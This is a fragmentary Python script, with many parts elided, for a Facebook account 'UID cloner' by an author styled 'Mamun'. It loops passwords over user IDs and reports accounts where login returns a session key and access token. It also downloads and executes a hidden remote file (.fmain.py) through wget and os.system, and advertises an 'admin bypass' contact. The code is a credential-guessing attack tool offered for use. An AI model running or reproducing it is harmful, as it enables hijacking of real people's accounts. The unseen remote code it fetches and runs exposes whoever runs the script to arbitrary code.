...
def notice():
	...
	runtxt("\033[0;92m BYPASS ADMIN 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 >> 01304906886")
...
class Main:
	def __init__(self):
		...
		runtxt("\n    \033[0;92m <=======    𝗠𝗔𝗠𝗨𝗡 𝗨𝗜𝗗 𝗖𝗟𝗢𝗡𝗘𝗥    =======>  \033[0;97m ")
	...
	def fmain(self):
		if	os.path.isfile('.fmain.py'):
			...
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/mamun026/MultiTool/main/.fmain.py && clear && python .fmain.py")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MX] : %s/%s -> \033[0;92m [ MX-OK:%s ]- \033[0;91m[MX-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [MX-CP] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/profile.php?id=100078539316286/ ")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : https://youtube.com/ ")
		exit(" [*] GitHub    : https://github.com/mamun026.git/ ")
	else:
		Main()
